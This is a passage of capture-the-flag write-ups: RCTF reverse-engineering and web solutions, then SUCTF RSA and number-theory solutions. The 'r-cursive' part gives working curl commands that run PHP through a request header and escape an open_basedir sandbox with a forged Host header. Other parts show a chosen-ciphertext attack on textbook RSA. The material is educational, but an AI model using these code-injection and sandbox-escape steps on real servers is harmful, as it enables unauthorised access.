*)result);\n  result[7].qwords.high = v3;\n```\n\nThe logic is to regard 2 char arrays as arrays of `uint64_t`, multiply the input by `s` (the welcome message) and `0xFFFFFFFF` after that, then store the result in the result array.\n\nTake a look at XMM instructions that follow:\n\n```assembly\nmovdqa  xmm1, xmmword ptr [rsp+198h+result] ; regard result as array of uint128_t\nmov     qword ptr [rsp+198h+result+78h], rax\nmovdqa  xmm0, xmmword ptr cs:unk_602070\npxor    xmm1, xmmword ptr cs:keys ; xmm1 = result[0] ^ keys[0]\nmovdqa  xmm4, xmmword ptr [rsp+198h+result+20h]\npxor    xmm0, xmmword ptr [rsp+198h+result+10h] ; xmm0 = keys[1] ^ result[1]\nmovdqa  xmm3, xmmword ptr [rsp+198h+result+30h]\npxor    xmm4, xmmword ptr cs:unk_602080 ; xmm4 = xor 2\nmovdqa  xmm2, xmmword ptr [rsp+198h+result+40h]\npxor    xmm3, xmmword ptr cs:unk_602090 ; xmm5 = xor3\npor     xmm1, xmm0      ; xmm1 = [0] | [1]\npxor    xmm2, xmmword ptr cs:unk_6020A0 ; xmm2 = xor 4\nmovdqa  xmm0, xmmword ptr [rsp+198h+result+60h]\npor     xmm4, xmm1      ; xmm4 = [0] | [1] | [2]\nmovdqa  xmm1, xmmword ptr [rsp+198h+result+50h]\npxor    xmm0, xmmword ptr cs:unk_6020C0 ; xmm0 = xor 6\npor     xmm3, xmm4      ; xmm3 = [0] | [1] | [2] | [3]\npxor    xmm1, xmmword ptr cs:unk_6020B0 ; xmm1 = xor [5]\npor     xmm2, xmm3      ; xmm2 = [0] | [1] | [2] | [3] | [4]\nmovdqa  xmm3, xmm2\nmovdqa  xmm2, xmm1\nmovdqa  xmm1, xmm0\nmovdqa  xmm0, xmmword ptr cs:unk_6020D0\npor     xmm2, xmm3      ; xmm2 = [0] | [1] | [2] | [3] | [4] | [5]\npxor    xmm0, xmmword ptr [rsp+198h+result+70h] ; xmm0 = xor7\npor     xmm1, xmm2\npor     xmm0, xmm1\nmovdqa  xmm1, xmm0\npsrldq  xmm1, 8\npor     xmm0, xmm1\nmovq    rax, xmm0\ntest    rax, rax\njz      short loc_400A86 ; jmp if correct\nmov     edi, offset s   ; \"Incorrect.\"\ncall    _puts\n```\n\nThe logic is, \"xor\" the result with the key, and \"or\" all of them together; if the final value obtained is 0, the answer is correct. This means that, all of the \"xor\" result must be 0, which means that result array from `sub_400BA0` must be same as key.\n\nInterestingly, we can see the optimisation of the compiler, which generates the code that will be faster on out\\-of\\-order CPUs.\n\nSo take a look at `sub_400BA0`:\n\n```c\nunsigned __int64 __fastcall sub_400BA0(q_xmm_word res, unsigned __int64 fc5, unsigned __int64 zero)\n{\n  unsigned __int64 fc5_; // r10\n  unsigned __int64 result; // rax\n  unsigned __int64 v5; // rdx\n  __int64 v6; // rbp\n  int v7; // ebp\n  unsigned __int64 v8; // rbx\n  unsigned __int64 v9; // r10\n  unsigned __int64 v10; // r8\n  q_xmm_word v11; // tt\n  unsigned __int64 v12; // rsi\n  q_xmm_word v13; // ax\n  unsigned __int64 v14; // rcx\n  __int64 v15; // rdi\n  q_xmm_word v16; // ax\n  q_xmm_word tmp; // tt\n\n  fc5_ = fc5;\n  result = res.qwords.low;\n  if ( zero )\n  { // can't reach here, zero is always 0, possibly obsfucation\n    if ( zero > res.qwords.high )\n    {\n      result = res.qwords.low;\n    }\n    else\n    {\n      _BitScanReverse64((unsigned __int64 *)&v6, zero);\n      v7 = v6 ^ 0x3F;\n      if ( v7 )\n      {\n        v8 = fc5 << v7;\n        v9 = (zero << v7) | (fc5 >> (64 - (unsigned __int8)v7));\n        v10 = res.qwords.low << v7;\n        v11.qwords.low = ((unsigned __int64)res.qwords.low >> (64 - (unsigned __int8)v7)) | (res.qwords.high << v7);\n        v11.qwords.high = res.qwords.high >> (64 - (unsigned __int8)v7);\n        v12 = v11.xmms % v9;\n        v13.xmms = (fc5 << v7) * (unsigned __int128)(unsigned __int64)(v11.xmms / v9);\n        v14 = v8 * (unsigned __int128)(unsigned __int64)(v11.xmms / v9) >> 64;\n        v15 = v8 * (v11.xmms / v9);\n        if ( v12 < v13.qwords.high || v12 == v13.qwords.high && v10 < v13.qwords.low )\n        {\n          v16.xmms = v13.xmms - __PAIR__(v9, v8);\n          v14 = v16.qwords.high;\n          v15 = v16.qwords.low;\n        }\n        result = ((v10 - v15) >> v7) | ((__PAIR__(v12, v10) - __PAIR__(v14, v15)) >> 64 << (64 - (unsigned __int8)v7));\n      }\n      else if ( zero < res.qwords.high || fc5 <= res.qwords.low )\n      {\n        result = res.qwords.low - fc5;\n      }\n    }\n  }\n  else\n  {\n    if ( fc5 <= res.qwords.high )\n    {\n      if ( !fc5 )\n        fc5_ = 1 / 0uLL;                        // never, fc5 is always a constant\n      tmp.qwords.low = res.qwords.low; // never, since for ret.high > fc5, the input is no longer readable\n      tmp.qwords.high = res.qwords.high % fc5_;\n      v5 = tmp.xmms % fc5_;\n    }\n    else\n    {//only useful part\n      v5 = res.xmms % fc5;\n    }\n    result = v5;\n  }\n  return result;\n}\n```\n\nThis function contains a lot useless code again: firstly, `zero` is always zero, so all the code in the first branch are useless; secondly, `fc5` is always non-zero, so the divivision by 0 exception can't occur; thirdly, `fc5 <= res.qwords.high` is always false, since for the result of multiplication to be larger than or equal to `0xFFFFFFFFFFFFFFC50000000000000000`, the input characters are not readable anymore, even if we took `0xFFFFFFFFFFFFFFFF` as the factor:\n\n```python\n>>> hex(0xFFFFFFFFFFFFFFC50000000000000000 / 0xFFFFFFFFFFFFFFFF)\n'0xffffffffffffffc5L'\n```\n\nAlso, the bytes after the flag are `U` instead of `0xFF` as shown above; a number larger than `0xFFFFFFFFFFFFFFC5L` won't occur in the input array. So this means we need to solve the following equations:\n\n```c\n(input[0] * 0x20656d6f636c6557) % 0xFFFFFFFFFFFFFFC5 == 0x2b7192452905e8fb\n(input[1] * 0x2046544352206f74) % 0xFFFFFFFFFFFFFFC5 == 0x7ba58f82bd898035\n(input[2] * 0x6548202138313032) % 0xFFFFFFFFFFFFFFC5 == 0xa3112746582e1434\n(input[3] * 0x2061207369206572) % 0xFFFFFFFFFFFFFFC5 == 0x163f756fcc221ab0\n(input[4] * 0x6320455279626142) % 0xFFFFFFFFFFFFFFC5 == 0xecc78e6fb9cba1fe\n(input[5] * 0x65676e656c6c6168) % 0xFFFFFFFFFFFFFFC5 == 0xdcdd8b49ea5d7e14\n(input[6] * 0x756f7920726f6620) % 0xFFFFFFFFFFFFFFC5 == 0xa2845fe0b3096f8e\n(input[7] * 0xffffffffffff002e) % 0xFFFFFFFFFFFFFFC5 == 0xaaaaaaaaaa975d1c\n(input[8] * 0xffffffffffffffff) % 0xFFFFFFFFFFFFFFC5 == 0x55555555555559a3\n(input[9] * 0xffffffffffffffff) % 0xFFFFFFFFFFFFFFC5 == 0x55555555555559a3\n(input[10] * 0xffffffffffffffff) % 0xFFFFFFFFFFFFFFC5 == 0x55555555555559a3\n(input[11] * 0xffffffffffffffff) % 0xFFFFFFFFFFFFFFC5 == 0x55555555555559a3\n(input[12] * 0xffffffffffffffff) % 0xFFFFFFFFFFFFFFC5 == 0x55555555555559a3\n(input[13] * 0xffffffffffffffff) % 0xFFFFFFFFFFFFFFC5 == 0x55555555555559a3\n(input[14] * 0xffffffffffffffff) % 0xFFFFFFFFFFFFFFC5 == 0x55555555555559a3\n(input[15] * 0xffffffffffffffff) % 0xFFFFFFFFFFFFFFC5 == 0x55555555555559a3\n```\n\nThese would take too long to brute-force (2^64-ish possibilities for each entry of the `input` array). But, multiply-modulo-compare is clearly just a [linear congruence](https://en.wikipedia.org/wiki/Chinese_remainder_theorem). A very fast algorithm to solve these is Euclid's extended algorithm.\n\n([solver script](scripts/babyre2.py))\n\n    666c61677b737461\n    795f7072696d655f\n    737461795f696e76\n    65727469626c655f\n    617761795f66726f\n    6d5f627275746566\n    6f7263657d005555\n    5555555555555555\n    5555555555555555\n    5555555555555555\n    5555555555555555\n    5555555555555555\n    5555555555555555\n    5555555555555555\n    5555555555555555\n    5555555555555555\n\nAnd after decoding:\n\n`flag{stay_prime_stay_invertible_away_from_bruteforce}`\n\n## 500 Web / r-cursive ###\n\n**Description**\n\n> LUL dat font\n> \n> http://r-cursive.ml\n> \n> hint: If you get stuck after arbitary code execution, try to escape the sandbox. phpinfo may help you figure out how the sandbox works.\n\n**Solution**\n\nAfter disabling the front-end font security (!), the page presents us with its source code:\n\n    <?php\n    $token = sha1($_SERVER['REMOTE_ADDR']);\n    $dir = '../sandbox/'.$token.'/';\n    is_dir($dir) ?: mkdir($dir);\n    is_file($dir.'index.php') ?: file_put_contents($dir.'index.php', str_replace('#SHA1#', $token, file_get_contents('./template')));\n    switch($_GET['action'] ?: ''){\n        case 'go':\n            header('Location: http://'.$token.'.sandbox.r-cursive.ml:1337/');\n            break;\n        case 'reset':\n            system('rm -rf '.$dir);\n            break;\n        default:\n            show_source(__FILE__);\n    }\n    ?>\n    <style>code{font-family: Segoe Script, Brush Script MT, cursive; font-size: 1.337em;}</style>\n\nWe can also look at the `template` file:\n\n    <?php\n    sha1($_SERVER['REMOTE_ADDR']) === '#SHA1#' ?: die();\n    ';' === preg_replace('/[^\\W_]+\\((?R)?\\)/', NULL, $_GET['cmd']) ? eval($_GET['cmd']) : show_source(__FILE__);\n\nSo this just seems to be a session management of some sort, only allowing access to subdomains whose name matches the hash of your IP address. Fair enough, let's create a session / subdomain with `http://r-cursive.ml?action=go`. Now at `http://<token>.sandbox.r-cursive.ml/` we are presented with exactly the same source code as in `template` above, but with the hash inserted.\n\nThere is an `eval`! But we need to provide the argument / code for it to run via the `cmd` GET parameter. And before `eval` is executed, the parameter is checked - it has to match the regular expression:\n\n    /[^\\W_]+\\((?R)?\\)/\n\nThe first part, `[^\\W_]+` is easy enough to understand - basically we can use simple functions with names consisting of `[A-Za-z0-9]` (not the underscore though). The `(?R)?` bit in parentheses was new to me, but `(?R)` simply means \"repeat the whole pattern\", and `?` makes it optional. So it is a recursive regular expression, which can match strings like `a()`, `something(else())`, `etc(etc(etc()))`. So `preg_replace` replaces these strings with the empty string, and the result of this must match `;`. So, to do some basic information gathering:\n\n    http://<token>.sandbox.r-cursive.ml:1337/?cmd=phpinfo();\n\nFrom the resulting page (as well as more involved commands perhaps), we can summarise:\n\n - `open_basedir=/var/www/sandbox/<token>/:/tmp/` - we can only access our current directory and `/tmp`; this applies to basically all PHP functions that we might want to use, e.g. `fopen`, `file_get_contents`, `include`, etc\n - `disable_functions=system,shell_exec,passthru,exec,popen,proc_open,pcntl_exec,mail,putenv,apache_setenv,mb_send_mail,assert,dl,set_time_limit,ignore_user_abort,symlink,link` - everything useful is disabled, including environmental variable setting and mail (which would enable us to run arbitrary binaries via `LD_PRELOAD` and upload to `/tmp`)\n - `disable_classes` - also lists some useful classes, not that important\n - `auto_prepend_file=/var/www/sandbox/init.php` - interesting\n - Apache 2 loaded modules: `core mod_so mod_watchdog http_core mod_log_config mod_logio mod_version mod_unixd mod_access_compat mod_alias mod_auth_basic mod_authn_core mod_authn_file mod_authz_core mod_authz_host mod_authz_user mod_autoindex mod_deflate mod_dir mod_env mod_filter mod_mime prefork mod_negotiation mod_php5 mod_reqtimeout mod_rewrite mod_setenvif mod_status mod_vhost_alias` - also interesting\n\nThe last two points are worth investigating in greater detail. But first, the hint on the challenge said we should first get arbitrary code execution. We can only execute functions applied to results of functions, or functions that take no arguments. This is not terribly useful, we need to find a way to provide additional input and execute that.\n\nClearly `eval` is enabled, but what do we evaluate? [`getallheaders`](https://php.net/manual/en/function.getallheaders.php) is a useful function enabled on Apache servers. It returns an array of all of the request headers, which we can modify of course. However, if an array is cast to a string in PHP, it just turns into `\"Array\"`, so we can't pass this directly to `eval`. Something like `array_pop` would be useful, but remember - the regular expression disallows underscores. In the [same section](http://php.net/manual/en/ref.array.php), however, we can find [`current`](http://php.net/manual/en/function.current.php) which \"returns the current element in an array\". Luckily enough, the current element of an array is the first element by default, unless we iterate it somehow. And so:\n\n    $ curl -A \"echo 'hello world';\" \"http://<token>.sandbox.r-cursive.ml:1337/?cmd=eval(current(getallheaders()));\"\n\nThis prints out `hello world` as expected and clearly that `echo` command is not of the recursive regular expression form. So we have arbitrary code execution!\n\nNow let's think about how to \"escape the sandbox\". If we are believe that the homepage at `http://r-cursive.ml/` showed us its full source code, then our custom subdomain was created just by creating a directory in `/var/www/sandbox` and putting an `index.php` into it! Normally to configure a subdomain like this in Apache requires a `VirtualHost` directive in the configuration and reloading the server, but this was clearly not done.\n\nBut, from `phpinfo();`, we found out that the module [`mod_vhost_alias`](https://httpd.apache.org/docs/2.2/mod/mod_vhost_alias.html) is loaded. It allows a wildcard virtual host to be defined, then determine the correct document root to use for each virtual host based on ... the `Host` header provided by us. Naturally we control this header as well, although we still need to make sure we match the alias.\n\nWe can poke around a bit:\n\n    $ curl -H \"Host: <token>.sandbox.r-cursive.ml\" -A \"echo getcwd();\" \"http://<token>.sandbox.r-cursive.ml:1337/?cmd=eval(current(getallheaders()));\"\n    $ curl -H \"Host: <token>.r-cursive.ml\" -A \"echo getcwd();\" \"http://<token>.sandbox.r-cursive.ml:1337/?cmd=eval(current(getallheaders()));\"\n    $ curl -H \"Host: <token>.ml\" -A \"echo getcwd();\" \"http://<token>.sandbox.r-cursive.ml:1337/?cmd=eval(current(getallheaders()));\"\n    $ curl -H \"Host: <token>\" -A \"echo getcwd();\" \"http://<token>.sandbox.r-cursive.ml:1337/?cmd=eval(current(getallheaders()));\"\n    $ curl -H \"Host: <token>.whatever.com\" -A \"echo getcwd();\" \"http://<token>.sandbox.r-cursive.ml:1337/?cmd=eval(current(getallheaders()));\"\n\nAll of the above output the exact same thing, and it is our custom directory. This means that the directory to use is determined solely on the first part of the `Host` header. The fact that we are providing our URL might be confusing, but in fact `curl` only uses this to do DNS lookup. The `-H` overrides the header `curl` would normally send. This also works:\n\n    $ curl -H \"Host: <token>\" -A \"echo getcwd();\" \"http://x.sandbox.r-cursive.ml:1337/?cmd=eval(current(getallheaders()));\"\n\nNow our custom token is only present in the `Host` header. Even this works:\n\n    $ curl -H \"Host: <token>\" -A \"echo getcwd();\" \"http://r-cursive.ml:1337/?cmd=eval(current(getallheaders()));\"\n\nIn fact, the homepage and the custom userpages are hosted at the same IP, but the userpages are on port 1337. So with that we can guess that somewhere in Apache configuration, there is a bit like this:\n\n    <VirtualHost *:1337>\n      ServerAlias *\n      php_admin_value auto_prepend_file \"/var/www/sandbox/init.php\" \n      VirtualDocumentRoot /var/www/sandbox/%1\n    </VirtualHost>\n\nWhere `%1` refers to the first part of the `Host` header. Then `init.php` sets the `open_basedir` setting to the CWD (+ `/tmp/`). How can we abuse this? We would like to see the source of `init.php`. For that we need `open_basedir` to include `/var/www/sandbox`. Well, in Linux the path `/var/www/sandbox//` is the same as `/var/www/sandbox`. How can we make the path be empty? Playing around with the `Host` header, a lot of ideas get rejected by the server sending us `400 Bad Request`. Curiously enough, a leading dot `.` is allowed, so we can provide `Host: .a` as our custom header.\n\n    $ curl -H \"Host: .a\" \"http://r-cursive.ml:1337/\"\n\nThis now says `403 Forbidden`! But this:\n\n    $ curl -H \"Host: .a\" \"http://r-cursive.ml:1337/init.php\"\n\nDoes not say anything. The request goes through and we load the file `init.php`, but it doesn't print anything. Well, we are now in `/var/www/sandbox` - we can get back to our home directory:\n\n    $ curl -H \"Host: .a\" \"http://r-cursive.ml:1337/<token>/?cmd=phpinfo();\"\n\nNow `open_basedir` is `/var/www/sandbox:/tmp`. So, finally:\n\n    $ curl -H \"Host: .a\" -A \"show_source('../init.php');\" \"http://r-cursive.ml:1337/<token>/?cmd=eval(current(getallheaders()));\"\n\nIt works!\n\n`RCTF{apache_mod_vhost_alias_should_be_configured_correctly}`\n", "timestamp": "2025-10-24T11:38:53.201762"}
{"source": "github", "repo": "Aurel300/empirectf", "file": "writeups/2018-05-26-SUCTF/README.md", "url": "https://github.com/EmpireCTF/empirectf/blob/master/writeups/2018-05-26-SUCTF/README.md", "content": "# 2018-05-26-SUCTF #\n\n[Website](https://suctf.xctf.org.cn/) | [Official Write-ups and Docker images for challenges](https://www.anquanke.com/post/id/146419)\n\n---\n\n## Challenges ##\n\n### Reverse ###\n\n - [ ] 800 Python大法好?!\n - [x] [606 Enigma (in Chinese)](https://github.com/Mem2019/Mem2019.github.io/tree/master/writeups/suctf2018#enigma)\n - [ ] 952 RubberDucky\n - [ ] 425 RoughLike与期末大作业\n - [x] [312 babyre (in Chinese)](https://github.com/Mem2019/Mem2019.github.io/tree/master/writeups/suctf2018#babyre)\n - [x] [434 simpleformat (in Chinese)](https://github.com/Mem2019/Mem2019.github.io/tree/master/writeups/suctf2018#simpleformat)\n\n### Crypto ###\n\n - [ ] 625 Magic\n - [ ] 909 Pass\n - [ ] 625 Enjoy\n - [x] [512 Rsa](#512-crypto--rsa)\n - [x] [333 Rsa good](#333-crypto--rsa-good)\n\n### Misc ###\n\n - [x] [222 SandGame](#222-misc--sand-game)\n - [x] [465 Cycle](#465-misc--cycle)\n - [x] [740 TNT](#740-misc--tnt)\n - [ ] [540 Game (partial)](#540-misc--game-partial)\n - [ ] 833 Padding的秘密\n - [x] [89 签到](#89-misc--签到)\n\n### Pwn ###\n\n - [ ] 1000 Heapprint\n - [x] [689 lock2 (in Chinese)](https://github.com/Mem2019/Mem2019.github.io/tree/master/writeups/suctf2018#lock2)\n - [ ] 952 Noend\n - [x] [689 Heap (in Chinese)](https://github.com/Mem2019/Mem2019.github.io/tree/master/writeups/suctf2018#heap)\n - [ ] 540 Note\n\n### Web ###\n\n - [ ] 909 MultiSql\n - [ ] 1000 Homework\n - [ ] 909 HateIT\n - [ ] 416 Getshell\n - [ ] 219 Anonymous\n\n---\n\n## Pwn & Reverse (in Chinese) ##\n\n[https://github.com/Mem2019/Mem2019.github.io/tree/master/writeups/suctf2018](https://github.com/Mem2019/Mem2019.github.io/tree/master/writeups/suctf2018)\n\n## 512 Crypto / Rsa ##\n\n**Description**\n\n> nc game.suctf.asuri.org:10004\n\n**Files provided**\n\n - `dl.py` - the script running on the server (more or less)\n\n**Solution**\n\nLooking through the script, it is an implementation of RSA encryption as well as decryption. We see a line that is just:\n\n    plain = \n\nSo this is what we are looking for, everything else is printed out by the server upon connection, so we have:\n\n - `e` - public exponent, always `3` (!)\n - `d` - private decryption key\n - `n` - modulus\n - `r` - random number between `2` and `n - 1`\n - `c2` - `(pow(r, e, n) * c) % n`\n\nNote that `c`, basically equivalent to `cipher` is not given, but it is calculated as:\n\n    cipher = n2b(pow(b2n(plain), e, n))\n    c = b2n(cipher)\n    c2 = (pow(r, e, n) * c) % n\n\n(Where `n2b` and `b2n` convert big integers to bytes and vice versa.)\n\nThe `decrypt` function in the code keeps track of which messages have already been decrypted and never decrypts the same message twice. This would hint at an attack like [this](https://security.stackexchange.com/a/166371). As far as I can tell, however, this is just a red herring - every time, we actually get a different plain text encoded in `c2`, because of the random number `r`.\n\nAfter connecting we obtain some numbers, e.g.:\n\n    e = 3\n    d = 44099662569240083770100452501923890981810347032878178494549569926293640377794102787757812392102295343611476808834126649538952636114181616043006492565612847637935953145160211951331986860339486196832569683821120141014991379839508808414941455385036209313700326288366870889877799654511681743709353299322639045424737161223404842883211346043467541833205836604553399746326181139106884008412679110817142624390168364685584282908134947826592906891361640349523847551416712367526240125746834000852838264832774661329773724115660989856782878284849614002221996848649738605272015463464761741155635215695838441165137785286974315511355\n    n = 66149493853860125655150678752885836472715520549317267741824354889440460566691154181636718588153443015417215213251189974308428954171272424064509738848419271456903929717740317926997980290509229295248854525731680211522487069759263212622412183077554313970550489432550306334816699481767522615564029948983958568137620658877310430228751724173392407096452402130591891085563316308684064273945573863484366971922314948362237647033045688312629960213147916734376716527936706960022935808934003360529947191458592952573768999508441911956808173380895703456745350452416319736699139180410176783788574649448360069042777614429267146945551\n    c2 = 555197326820687822845510331497179235125339466901080486910855226563203620818546850664900334272558154897244807056051523382877025491022062653026950874706989089221441667975141857822467698984691394910413664568917834616477399551120134295817945851631274198716158916189852164710577201354848179364060363067031037364427257976432242368238133900381040554836326341802202448208567506144152953418971177837011508755732404288723827523795854985185948476628039747879323375293128273047932571155207763884307597378004378050070053742756331027480852317861759308073697411546007713846993873843230860015051875293239089946152466157009664950134\n    r = 10657569616260118329404340834944716349573302183819435149128694785393343378737463193725664551171398971313585489634185044223763567210283228421322336466640716431124465773124614630377991915537115525004826903143400934299400374433218002815925291846775392164216151281973712468770631608862294981158069476777954388430091851221662753406685943465861825823022246167534811255026679837874465999186093902141814352480104598540063144133827422059918317985113532119825002361414848005564824947140564506090260655465903631363018380958302145031719465637060685617098378870594910675914122403158164788620459231729385876792019987208461650165272\n\nWe can calculate `x = pow(r, e, n)`. Then we know `c2 = (x * c) % n`. [Linear congruence](https://en.wikipedia.org/wiki/Chinese_remainder_theorem)! Using the [extended Euclidian algorithm](https://en.wikipedia.org/wiki/Extended_Euclidean_algorithm) we can calculate `c`:\n\n    c = 143129603814823250510404042715251295520311679883019843825444039909477035653981361001492284240752368821689489939453177391156320036567415425905134935614309449291442196170277986126949\n\nAnd we know `c` is just `pow(b2n(plain), e, n)`, and that `e` is `3`. So we just need to calculate integer the cube root of `c` to obtain `plain`. (This works because the plaintext is much smaller than the modulus.)\n\n    b2n(plain) = 523090086828889678262514935810790175456119161691107232673149\n\nConverting back to bytes (e.g. taking `hex` and `bytes`), we get:\n\n`SUCTF{Ju5t_hav3_fun_emmm}`\n\n([full decryption script](scripts/rsa.py))\n\n## 333 Crypto / Rsa good ##\n\n**Description**\n\n> nc game.suctf.asuri.org:10005\n\n**No files provided**\n\n**Solution**\n\nInterestingly enough this challenge is easier than the other RSA one (at least by the number of solves).\n\nUpon connection we are presented with:\n\n    Welcome to the Digital RSA2:\n    e: \n    65537\n    n: \n    342455709448748144126356744976385170973517744602059517490422045682543287960167955127769980654250125331171261846920903825693509591867402054748269545989173880386620770767057995165518626234085821335790902075953939551116777613078301529741199260825495593643848062203477826484698214686522001924292713782595019038086926834360866522789951283935502968545347160597915951673480253253216027297476774028106074570088497425654525031294571609018030761716007610673627163536370205798268831577480146622906265953470659107801115278898533958878045433701201601516984582294147038705649395688342773971893457527598221773710752744142729023770679\n    Please choose:\n    E : RSA Encryption System;\n    D : RSA Decryption System;\n    F : Encrypt the flag\n    Choice:\n\nConnecting again we still get the same public key, so we know these are constant. Choosing `F` for \"Encrypt the flag\" we get:\n\n    Choice: F\n    The flag cipher: \n    243420924328019812271997044731623514889072013216740847720538921813603074579018426992363519438216665458449517736036680099669329047658366669928864161251079327176102746954881753105898140124307640158445282448971434226898555798002446996700559970559548971654834334722774468853381736748850864907623960412915566112188526448623525238791386352470503696397575318422285090452116421782424854542335127142332557429789789260629596615637544991150867865734994690229005665154516290305677302120756735454346978770298508896241592312066522400540590533864364814412327485698942887055344712184230620270852672815875102620140460088293284634875172\n\nBut if we try `D` to decrypt it:\n\n    Choice: D\n    Pick the cipher: 243420924328019812271997044731623514889072013216740847720538921813603074579018426992363519438216665458449517736036680099669329047658366669928864161251079327176102746954881753105898140124307640158445282448971434226898555798002446996700559970559548971654834334722774468853381736748850864907623960412915566112188526448623525238791386352470503696397575318422285090452116421782424854542335127142332557429789789260629596615637544991150867865734994690229005665154516290305677302120756735454346978770298508896241592312066522400540590533864364814412327485698942887055344712184230620270852672815875102620140460088293284634875172\n    No Permission.\n\nWe cannot.\n\nOn the [Wikipedia page for RSA](https://en.wikipedia.org/wiki/RSA_(cryptosystem)#Attacks_against_plain_RSA) there is a section about \"attacks against plain RSA\". This refers to RSA where the message is used directly to calculate the cipher text, without first applying appropriate padding (which adds random bits to the message that are removed by the decrypting side). We can verify that we are dealing with a plain RSA system by encrypting a `1` (since to any power it will remain `1`, which would not be the case if additional random bits were added).\n\n    Choice: E\n    Pick the Plain: 1\n    The cipher: \n    1\n\nAnd indeed, we get a `1` back, so plain RSA it is. From the Wikipedia page:\n\n> RSA has the property that the product of two ciphertexts is equal to the encryption of the product of the respective plaintexts. That is `a^e * b^e ≡ (a * b)^e (mod n)`. Because of this multiplicative property a chosen-ciphertext attack is possible. E.g., an attacker who wants to know the decryption of a ciphertext `c ≡ m^e (mod n)` may ask the holder of the private key d to decrypt an unsuspicious-looking ciphertext `c' ≡ c * r^e (mod n)` for some value `r` chosen by the attacker. Because of the multiplicative property `c'` is the encryption of `m * r (mod n)`. Hence, if the attacker is successful with the attack, he will learn `m * r (mod n)` from which he can derive the message `m` by multiplying `m * r` with the modular inverse of `r modulo n`.\n\nSo let's do this. We take the encrypted flag and multiply the number with `pow(2, e, n) = pow(2, 65537, 3424557...)`:\n\n    pow(2, e, n) = 253533347612163002791886149673871474605477566060494100900649977387523936490011200771487664540573862401127782940822894124517525940671378103381498115003800811143059755235973550463496903221735771385510711869164940252208663751050331845881809927429493349330615640365913183978141205027870223044370664399273744302849537780534440593010007234468088802206265899273888960178178247065835675284232483024487691698313649281243369462937869862410510886840683637590739883104204213947970689447158858802844942883714082082416987121761724704121496327579561253955594882154504900621183316688566233625249743293268141871650808028469815844854937\n    (pow(2, e, n) * flag) % n = 327005676879028949445768932328296798578464592482540599865339824879152179277130842985648347238681307423212757689553473202800400659572189867088027502354498170958142760108282922361502863136370878203867642352911957027678835854097120819477969702374483395672012827361963447090350013221738881058248169085023233180780932337153928737226216195886364857280976894584300536964443205879002080240583242633283087772234506175835525942910571484560986599633312566734242903925452248023383920942967289609285076849334111576069897353386434756899938348014955344599788817989686289801571778983708369735446124697310165980202517269943631613975572\n\nWe then ask the server to decrypt it for us:\n\n    Choice: D\n    Pick the cipher: 327005676879028949445768932328296798578464592482540599865339824879152179277130842985648347238681307423212757689553473202800400659572189867088027502354498170958142760108282922361502863136370878203867642352911957027678835854097120819477969702374483395672012827361963447090350013221738881058248169085023233180780932337153928737226216195886364857280976894584300536964443205879002080240583242633283087772234506175835525942910571484560986599633312566734242903925452248023383920942967289609285076849334111576069897353386434756899938348014955344599788817989686289801571778983708369735446124697310165980202517269943631613975572\n    The plain: \n    1264754223903805991037559546437770498994402578495550825086029019564913836209616386580\n\nAnd now we just divide by `2` (since the message is much smaller than the modulus, so we don't need to worry about the inverse with respect to the modulus):\n\n    bytes.fromhex(hex(1264754223903805991037559546437770498994402578495550825086029019564913836209616386580 // 2)[2:])\n\n`SUCTF{Ju5t_hav3_fun_1n_R34_4Ga1N!}`\n\n## 222 Misc / Sand Game ##\n\n**Description**\n\n> 注:此题flag格式为`flag{*}`\n\n**Translated description**\n\n> Note: This question flag format is `flag{*}`\n\n**Files given**\n\n - `game.py` - script used to encrypt the flag into `sand.txt`:\n - `sand.txt` - the encrypted flag\n\n**Solution**\n\nThe encryption script:\n\n    import flag\n    flag = flag.flag\n    sands = int(flag[5:-1].encode(\"hex\"), 16)\n    holes = [257, 263, 269, 271, 277, 281, 283, 293, 307, 311, 313, 317, 331, 337, 347, 349, 353, 359, 367, 373]\n    with open(\"sand.txt\", \"w\") as f:\n        for i in range(len(holes)):\n            sand = sands % holes[i]\n            f.write(str(sand)+\"\\n\")\n\nAnd \"sand\":\n\n    222\n    203\n    33\n    135\n    203\n    62\n    227\n    82\n    239\n    82\n    11\n    220\n    74\n    92\n    8\n    308\n    195\n    165\n    87\n    4\n\nInteresting - the flag is given to us characterised by remainders after division by 20 consecutive prime numbers. In other words:\n\n    flag = x1  * 257 + 222\n    flag = x2  * 263 + 203\n    flag = x3  * 269 + 33\n    flag = x4  * 271 + 135\n    flag = x5  * 277 + 203\n    flag = x6  * 281 + 62\n    flag = x7  * 283 + 227\n    flag = x8  * 293 + 82\n    flag = x9  * 307 + 239\n    flag = x10 * 311 + 82\n    flag = x11 * 313 + 11\n    flag = x12 * 317 + 220\n    flag = x13 * 331 + 74\n    flag = x14 * 337 + 92\n    flag = x15 * 347 + 8\n    flag = x16 * 349 + 308\n    flag = x17 * 353 + 195\n    flag = x18 * 359 + 165\n    flag = x19 * 367 + 87\n    flag = x20 * 373 + 4\n\nFor some unknown integers `x1`, `x2`, ..., `x20`. How do we use this information? Well, even though the `x` numbers are not equal, we know that on the left-hand side of the equations it is the same flag. So if we take any two of the right-hand sides, we can equate them:\n\n    x1 * 257 + 222 = x2 * 263 + 203\n    x1 * 257 + 222 = x3 * 269 + 33\n    ...\n\nLet's consider each line separately.\n\n    x1 * 257 + 222 = x2 * 263 + 203\n\nThis is a single equation with two unknowns, so there are infinitely many solutions. Nonetheless, it does provide us with some information about the relationship between `x1` and `x2`. But in fact, let's forget about `x2` as a variable and let's just find the general form of `x1` that will satisfy the above. It is just a congruence with respect to some modulus after all:\n\n    all x1 such that\n    (x1 * 257 + 222) % 263 = 203\n\nBy starting with `x1 = 0`, we can easily check each successive value of `x1` until the above equation holds (there is a faster way, the CRT, but it does not matter since the primes are small). Furthermore, the moduli are all primes, so necessarily they are co-prime to one another. The LCM of any two primes is their product, so after finding the first solution iteratively, we already know that the next one will be `x1 + 263` (the first solution + the modulus we are currently checking).\n\nSo what is the result of doing all this? We have reduced the original set of equations of the form:\n\n    flag = x1  * 257 + 222\n    flag = x2  * 263 + 203\n    ...\n    flag = x20 * 373 + 4\n\nTo another set of equations, of the form:\n\n    x1 = y1  * 263 + 47\n    x1 = y2  * 269 + 83\n    x1 = y3  * 271 + 103\n    x1 = y4  * 277 + 181\n    x1 = y5  * 281 + 194\n    x1 = y6  * 283 + 76\n    x1 = y7  * 293 + 69\n    x1 = y8  * 307 + 190\n    x1 = y9  * 311 + 256\n    x1 = y10 * 313 + 300\n    x1 = y11 * 317 + 74\n    x1 = y12 * 331 + 2\n    x1 = y13 * 337 + 128\n    x1 = y14 * 347 + 226\n    x1 = y15 * 349 + 37\n    x1 = y16 * 353 + 254\n    x1 = y17 * 